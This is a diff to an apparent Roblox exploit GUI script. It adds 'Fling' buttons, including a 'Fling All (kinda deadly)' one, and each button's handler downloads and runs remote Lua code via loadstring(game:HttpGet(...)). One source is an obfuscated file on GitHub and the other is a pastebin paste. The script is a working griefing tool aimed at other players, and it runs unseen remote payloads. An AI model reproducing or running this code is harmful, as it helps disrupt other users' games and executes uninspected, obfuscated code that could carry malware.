@@ -73,19 +73,34 @@ tab1Frame.Position = UDim2.new(0, 0, 0.2, 0)
 tab1Frame.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4) -- Light Gray
 tab1Frame.Parent = mainFrame
 
--- Example button inside Tab 1
-local flingButton = Instance.new("TextButton")
-flingButton.Size = UDim2.new(0.2, 0, 0.1, 0)
-flingButton.Position = UDim2.new(0.05, 0, 0.05, 0)
-flingButton.BackgroundColor3 = Color3.new(0, 0.5, 0.2) -- Green
-flingButton.TextColor3 = Color3.new(1, 1, 1) -- White
-flingButton.Text = "Click Fling"
-flingButton.Parent = tab1Frame
+-- Example button 1 inside Tab 1
+local flingButton1 = Instance.new("TextButton")
+flingButton1.Size = UDim2.new(0.2, 0, 0.1, 0)
+flingButton1.Position = UDim2.new(0.05, 0, 0.05, 0)
+flingButton1.BackgroundColor3 = Color3.new(0, 0.5, 0.2) -- Green
+flingButton1.TextColor3 = Color3.new(1, 1, 1) -- White
+flingButton1.Text = "Click Fling 1"
+flingButton1.Parent = tab1Frame
 
--- Connect event for the Fling button
-flingButton.MouseButton1Click:Connect(function()
-    print("Fling button clicked!")
+-- Connect event for the Fling button 1
+flingButton1.MouseButton1Click:Connect(function()
+    print("Fling button 1 clicked!")
     loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'), true))()
+end)
+
+-- Example button 2 inside Tab 1 (Fling All)
+local flingButton2 = Instance.new("TextButton")
+flingButton2.Size = UDim2.new(0.2, 0, 0.1, 0)
+flingButton2.Position = UDim2.new(0.3, 0, 0.05, 0)
+flingButton2.BackgroundColor3 = Color3.new(0, 0.5, 0.2) -- Green
+flingButton2.TextColor3 = Color3.new(1, 1, 1) -- White
+flingButton2.Text = "Fling All (kinda deadly)"
+flingButton2.Parent = tab1Frame
+
+-- Connect event for the Fling button 2
+flingButton2.MouseButton1Click:Connect(function()
+    print("Fling button 2 clicked!")
+    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
 end)
 
 -- Connect events for the Tab button
